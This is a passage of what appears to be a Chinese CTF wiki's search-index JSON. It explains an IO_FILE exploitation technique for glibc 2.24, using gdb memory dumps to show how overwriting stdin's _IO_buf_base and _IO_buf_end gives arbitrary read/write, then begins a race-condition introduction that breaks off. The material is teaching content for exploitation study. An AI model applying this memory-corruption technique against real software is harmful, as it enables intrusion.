scanf(\n%s\n,stack_buf);\n\n}\n\n\n\n\n\u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528stdin\u4e4b\u524d\uff0cstdin\u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684\n\n\n0x7ffff7dd18e0 \n_IO_2_1_stdin_\n:    0x00000000fbad2088  0x0000000000000000\n0x7ffff7dd18f0 \n_IO_2_1_stdin_+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1900 \n_IO_2_1_stdin_+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1910 \n_IO_2_1_stdin_+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1920 \n_IO_2_1_stdin_+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1930 \n_IO_2_1_stdin_+80\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940 \n_IO_2_1_stdin_+96\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950 \n_IO_2_1_stdin_+112\n:    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960 \n_IO_2_1_stdin_+128\n:    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970 \n_IO_2_1_stdin_+144\n:    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980 \n_IO_2_1_stdin_+160\n:    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990 \n_IO_2_1_stdin_+176\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0 \n_IO_2_1_stdin_+192\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19b0 \n_IO_2_1_stdin_+208\n:    0x0000000000000000  0x00007ffff7dd06e0 \n== vtable\n\n\n\n\n\u8c03\u7528scanf\u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end\u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316\n\n\n0x7ffff7dd18e0 \n_IO_2_1_stdin_\n:    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0 \n_IO_2_1_stdin_+16\n: 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900 \n_IO_2_1_stdin_+32\n: 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910 \n_IO_2_1_stdin_+48\n: 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1920 \n_IO_2_1_stdin_+64\n: 0x0000000000602410  0x0000000000000000\n0x7ffff7dd1930 \n_IO_2_1_stdin_+80\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940 \n_IO_2_1_stdin_+96\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950 \n_IO_2_1_stdin_+112\n:    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960 \n_IO_2_1_stdin_+128\n:    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970 \n_IO_2_1_stdin_+144\n:    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980 \n_IO_2_1_stdin_+160\n:    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990 \n_IO_2_1_stdin_+176\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0 \n_IO_2_1_stdin_+192\n:    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0 \n_IO_2_1_stdin_+208\n:    0x0000000000000000  0x00007ffff7dd06e0\n\n\n\n\n\u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9estdin\u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f0x602010\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n\n\n\n\u5206\u914d\u7684\u5806\u5927\u5c0f\u662f0x400\u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end\n\u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e\n\n\n0x602000:   0x0000000000000000  0x0000000000000411 \n== \u5206\u914d0x400\u5927\u5c0f\n0x602010:   0x000000000a333231  0x0000000000000000 \n== \u7f13\u51b2\u6570\u636e\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n\n\n\n\n\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533abuf\u7684\u5730\u5740\u662f0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base\u548c_IO_buf_end\u5230\u7f13\u51b2\u533abuf\u7684\u5730\u5740\n\n\n0x7ffff7dd18e0 \n_IO_2_1_stdin_\n:    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0 \n_IO_2_1_stdin_+16\n: 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900 \n_IO_2_1_stdin_+32\n: 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910 \n_IO_2_1_stdin_+48\n: 0x0000000000602010  0x00007ffff7dd2740 \n== _IO_buf_base\n0x7ffff7dd1920 \n_IO_2_1_stdin_+64\n: 0x00007ffff7dd27c0  0x0000000000000000 \n== _IO_buf_end\n0x7ffff7dd1930 \n_IO_2_1_stdin_+80\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940 \n_IO_2_1_stdin_+96\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950 \n_IO_2_1_stdin_+112\n:    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960 \n_IO_2_1_stdin_+128\n:    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970 \n_IO_2_1_stdin_+144\n:    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980 \n_IO_2_1_stdin_+160\n:    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990 \n_IO_2_1_stdin_+176\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0 \n_IO_2_1_stdin_+192\n:    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0 \n_IO_2_1_stdin_+208\n:    0x0000000000000000  0x00007ffff7dd06e0\n\n\n\n\n\u4e4b\u540escanf\u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u52300x7ffff7dd2740\u7684\u4f4d\u7f6e\n\n\n0x7ffff7dd2740 \nbuf\n:   0x00000a6161616161  0x0000000000000000\n0x7ffff7dd2750 \nbuffer\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2760 \nbuffer\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2770 \nbuffer\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2780 \nbuffer\n:    0x0000000000000000  0x0000000000000000", 
            "title": "\u65b0\u7248\u672c libc \u4e0b IO_FILE \u7684\u5229\u7528"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#libcio_file", 
            "text": "", 
            "title": "\u65b0\u7248\u672clibc\u4e0bIO_FILE\u7684\u5229\u7528"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#_1", 
            "text": "\u5728\u6700\u65b0\u7248\u672c\u7684glibc\u4e2d(2.24)\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9IO_FILE_plus\u7684vtable\u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc\n\u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5vtable\u5730\u5740\u7684\u5408\u6cd5\u6027\u3002  \u5982\u679cvtable\u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1abort\u3002  \u9996\u5148\u4f1a\u9a8c\u8bc1vtable\u662f\u5426\u4f4d\u4e8e_IO_vtable\u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check\u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002  \u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528vtable\u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#_2", 
            "text": "\u5728vtable\u96be\u4ee5\u88ab\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ecevtable\u8f6c\u79fb\u5230_IO_FILE\u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002\n\u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE\u5728\u4f7f\u7528\u6807\u51c6IO\u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982fwrite\u3001fread\u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002  struct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n  int _flags2;\n  _IO_off_t _old_offset; /* This used to be _offset but it s too small.  */\n};  \u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7scanf\\printf\u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002  \u5728_IO_FILE\u4e2d_IO_buf_base\u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end\u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002", 
            "title": "\u65b0\u7684\u5229\u7528\u6280\u672f"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#_3", 
            "text": "\u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE\u5bf9\u4e8e\u8c03\u7528scanf\u7684\u4f5c\u7528  #include  stdio.h \n\nchar buf[100];\n\nint main()\n{\n char stack_buf[100];\n scanf( %s ,stack_buf);\n scanf( %s ,stack_buf);\n\n}  \u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528stdin\u4e4b\u524d\uff0cstdin\u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684  0x7ffff7dd18e0  _IO_2_1_stdin_ :    0x00000000fbad2088  0x0000000000000000\n0x7ffff7dd18f0  _IO_2_1_stdin_+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1900  _IO_2_1_stdin_+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1910  _IO_2_1_stdin_+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1920  _IO_2_1_stdin_+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1930  _IO_2_1_stdin_+80 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940  _IO_2_1_stdin_+96 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950  _IO_2_1_stdin_+112 :    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960  _IO_2_1_stdin_+128 :    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970  _IO_2_1_stdin_+144 :    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980  _IO_2_1_stdin_+160 :    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990  _IO_2_1_stdin_+176 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0  _IO_2_1_stdin_+192 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19b0  _IO_2_1_stdin_+208 :    0x0000000000000000  0x00007ffff7dd06e0  == vtable  \u8c03\u7528scanf\u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end\u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316  0x7ffff7dd18e0  _IO_2_1_stdin_ :    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0  _IO_2_1_stdin_+16 : 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900  _IO_2_1_stdin_+32 : 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910  _IO_2_1_stdin_+48 : 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1920  _IO_2_1_stdin_+64 : 0x0000000000602410  0x0000000000000000\n0x7ffff7dd1930  _IO_2_1_stdin_+80 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940  _IO_2_1_stdin_+96 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950  _IO_2_1_stdin_+112 :    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960  _IO_2_1_stdin_+128 :    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970  _IO_2_1_stdin_+144 :    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980  _IO_2_1_stdin_+160 :    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990  _IO_2_1_stdin_+176 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0  _IO_2_1_stdin_+192 :    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0  _IO_2_1_stdin_+208 :    0x0000000000000000  0x00007ffff7dd06e0  \u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9estdin\u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f0x602010  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]  \u5206\u914d\u7684\u5806\u5927\u5c0f\u662f0x400\u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end\n\u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e  0x602000:   0x0000000000000000  0x0000000000000411  == \u5206\u914d0x400\u5927\u5c0f\n0x602010:   0x000000000a333231  0x0000000000000000  == \u7f13\u51b2\u6570\u636e\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000  \u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533abuf\u7684\u5730\u5740\u662f0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base\u548c_IO_buf_end\u5230\u7f13\u51b2\u533abuf\u7684\u5730\u5740  0x7ffff7dd18e0  _IO_2_1_stdin_ :    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0  _IO_2_1_stdin_+16 : 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900  _IO_2_1_stdin_+32 : 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910  _IO_2_1_stdin_+48 : 0x0000000000602010  0x00007ffff7dd2740  == _IO_buf_base\n0x7ffff7dd1920  _IO_2_1_stdin_+64 : 0x00007ffff7dd27c0  0x0000000000000000  == _IO_buf_end\n0x7ffff7dd1930  _IO_2_1_stdin_+80 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940  _IO_2_1_stdin_+96 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950  _IO_2_1_stdin_+112 :    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960  _IO_2_1_stdin_+128 :    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970  _IO_2_1_stdin_+144 :    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980  _IO_2_1_stdin_+160 :    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990  _IO_2_1_stdin_+176 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0  _IO_2_1_stdin_+192 :    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0  _IO_2_1_stdin_+208 :    0x0000000000000000  0x00007ffff7dd06e0  \u4e4b\u540escanf\u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u52300x7ffff7dd2740\u7684\u4f4d\u7f6e  0x7ffff7dd2740  buf :   0x00000a6161616161  0x0000000000000000\n0x7ffff7dd2750  buffer :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2760  buffer :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2770  buffer :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2780  buffer :    0x0000000000000000  0x0000000000000000", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/", 
            "text": "Race Condition\n\n\n\u6982\u8ff0\n\n\n\u6761\u4ef6\u7ade\u4e89\u662f\u6307\u4e00\u4e2a\u7cfb\u7edf\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u7684\u5148\u540e\u987a\u5e8f\u3002\u5f53\u8fd9\u4e9b\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u5e76\u6ca1\u6709\u6309\u7167\u5f00\u53d1\u8005\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0 bug\u3002\u8fd9\u4e2a\u672f\u8bed\u6700\u521d\u6765\u81ea\u4e8e\u4e24\u4e2a\u7535\u4fe1\u53f7\u4e92\u76f8\u7ade\u4e89\u6765\u5f71\u54cd\u8f93\u51fa\u7ed3\u679c\u3002\n\n\n\n\n\u6761\u4ef6\u7ade\u4e89\u4e3b\u8981\u51fa\u73b0\u5728\u5982\u4e0b\u9886\u57df\n\n\n\n\n\u7535\u5b50\u7cfb\u7edf\uff0c\u5c24\u5176\u662f\u903b\u8f91\u7535\u8def\n\n\n\u8ba1\u7b97\u673a\uff0c\u5c24\u5176\u662f\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u548c\u5206\u5e03\u5f0f\u7a0b\u5e8f\u3002\n\n\n\n\n\u7531\u4e8e\u76ee\u524d\u7684\u7cfb\u7edf\u4e2d\u5927\u91cf\u91c7\u7528\u5e76\u53d1\u7f16\u7a0b\uff0c\u7ecf\u5e38\u5bf9\u8d44\u6e90\u8fdb\u884c\u5171\u4eab\uff0c\u5f80\u5f80\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8003\u8651\u8ba1\u7b97\u673a\u7a0b\u5e8f\u65b9\u9762\u7684\u6761\u4ef6\u7ade\u4e89\u3002\u5f53\u4e00\u4e2a\u8f6f\u4ef6\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u7684\u987a\u5e8f\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6761\u4ef6\u7ade\u4e89\u3002\u7b80\u5355\u8003\u8651\u4e00\u4e0b\uff0c\u53ef\u4ee5\u77e5\u9053\u6761\u4ef6\u7ade\u4e89\u9700\u8981\u5982\u4e0b\u7684\n\u6761\u4ef6\n\uff1a\n\n\n\n\n\u5e76\u53d1\uff0c\u5373\u81f3\u5c11\u5b58\u5728\u4e24\u4e2a\u5e76\u53d1\u6267\u884c\u6d41\u3002\u8fd9\u91cc\u7684\u6267\u884c\u6d41\u5305\u62ec\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\uff0c\u4efb\u52a1\u7b49\u7ea7\u522b\u7684\u6267\u884c\u6d41\u3002\n\n\n\u5171\u4eab\u5bf9\u8c61\uff0c\u5373\u591a\u4e2a\u5e76\u53d1\u6d41\u4f1a\u8bbf\u95ee\u540c\u4e00\u5bf9\u8c61\u3002\n\u5e38\u89c1\u7684\u5171\u4eab\u5bf9\u8c61\u6709\u5171\u4eab\u5185\u5b58\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0c\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e9b\u5171\u4eab\u5bf9\u8c61\u662f\u7528\u6765\u4f7f\u5f97\u591a\u4e2a\u7a0b\u5e8f\u6267\u884c\u6d41\u76f8\u4e92\u4ea4\u6d41\u3002\n\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u8bbf\u95ee\u5171\u4eab\u5bf9\u8c61\u7684\u4ee3\u7801\u4e3a\n\u4e34\u754c\u533a\n\u3002\u5728\u6b63\u5e38\u5199\u4ee3\u7801\u65f6\uff0c\u8fd9\u90e8\u5206\u5e94\u8be5\u52a0\u9501\u3002\n\n\n\u6539\u53d8\u5bf9\u8c61\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u63a7\u5236\u6d41\u4f1a\u6539\u53d8\u7ade\u4e89\u5bf9\u8c61\u7684\u72b6\u6001\u3002\u56e0\u4e3a\u5982\u679c\u7a0b\u5e8f\u53ea\u662f\u5bf9\u5bf9\u8c61\u8fdb\u884c\u8bfb\u64cd\u4f5c\uff0c\u90a3\u4e48\u5e76\u4e0d\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u3002\n\n\n\n\n\u7531\u4e8e\u5728\u5e76\u53d1\u65f6\uff0c\u6267\u884c\u6d41\u7684\u4e0d\u786e\u5b9a\u6027\u5f88\u5927\uff0c\u6761\u4ef6\u7ade\u4e89\u76f8\u5bf9\n\u96be\u5bdf\u89c9\n\uff0c\u5e76\u4e14\u5728\n\u590d\u73b0\u548c\u8c03\u8bd5\u65b9\u9762\u4f1a\u6bd4\u8f83\u56f0\u96be\n\u3002\u8fd9\u7ed9\u4fee\u590d\u6761\u4ef6\u7ade\u4e89\u4e5f\u5e26\u6765\u4e86\u4e0d\u5c0f\u7684\u56f0\u96be\u3002\n\n\n\u6761\u4ef6\u7ade\u4e89\u9020\u6210\u7684\u5f71\u54cd\u4e5f\u662f\u591a\u6837\u7684\uff0c\u8f7b\u5219\u7a0b\u5e8f\u5f02\u5e38\u6267\u884c\uff0c\u91cd\u5219\u7a0b\u5e8f\u5d29\u6e83\u3002\u5982\u679c\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u88ab\u653b\u51fb\u8005\u5229\u7528\u7684\u8bdd\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u4f7f\u5f97\u653b\u51fb\u8005\u83b7\u5f97\u76f8\u5e94\u7cfb\u7edf\u7684\u7279\u6743\u3002\n\n\n\u8fd9\u91cc\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002\n\n\n#include\n \npthread.h\n\n\n#include\n \nstdio.h\n\n\n\nint\n \ncounter\n;\n\n\nvoid\n \n*\nIncreaseCounter\n(\nvoid\n \n*\nargs\n)\n \n{\n\n  \ncounter\n \n+=\n \n1\n;\n\n  \nsleep\n(\n0.1\n);\n\n  \nprintf\n(\nThread %d has counter value %d\n\\n\n,\n \n(\nunsigned\n \nint\n)\npthread_self\n(),\n\n         \ncounter\n);\n\n\n}\n\n\n\nint\n \nmain\n()\n \n{\n\n  \npthread_t\n \np\n[\n10\n];\n\n  \nfor\n \n(\nint\n \ni\n \n=\n \n0\n;\n \ni\n \n \n10\n;\n \n++\ni\n)\n \n{\n\n    \npthread_create\n(\np\n[\ni\n],\n \nNULL\n,\n \nIncreaseCounter\n,\n \nNULL\n);\n\n  \n}\n\n  \nfor\n \n(\nint\n \ni\n \n=\n \n0\n;\n \ni\n \n \n10\n;\n \n++\ni\n)\n \n{\n\n    \npthread_join\n(\np\n[\ni\n],\n \nNULL\n);\n\n  \n}\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u6309\u5982\u4e0b\u65b9\u5f0f\u8f93\u51fa\n\n\n\u279c  005race_condition ./example1\nThread \n1859024640\n has counter value \n1\n\nThread \n1841583872\n has counter value \n2\n\nThread \n1832863488\n has counter value \n3\n\nThread \n1824143104\n has counter value \n4\n\nThread \n1744828160\n has counter value \n5\n\nThread \n1736107776\n has counter value \n6\n\nThread \n1727387392\n has counter value \n7\n\nThread \n1850304256\n has counter value \n8\n\nThread \n1709946624\n has counter value \n9\n\nThread \n1718667008\n has counter value \n10\n\n\n\n\n\n\u4f46\u662f\uff0c\u7531\u4e8e\u6761\u4ef6\u7ade\u4e89\u7684\u5b58\u5728\uff0c\u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5f80\u5f80\u4e0d\u5c3d\u4eba\u610f\n\n\n\u279c\n  \n005\nrace_condition\n \n.\n/\nexample1\n                          \n\nThread\n \n1417475840\n \nhas\n \ncounter\n \nvalue\n \n2\n\n\nThread\n \n1408755456\n \nhas\n \ncounter\n \nvalue\n \n2\n\n\nThread\n \n1391314688\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1356433152\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1365153536\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1373873920\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1382594304\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1400035072\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n 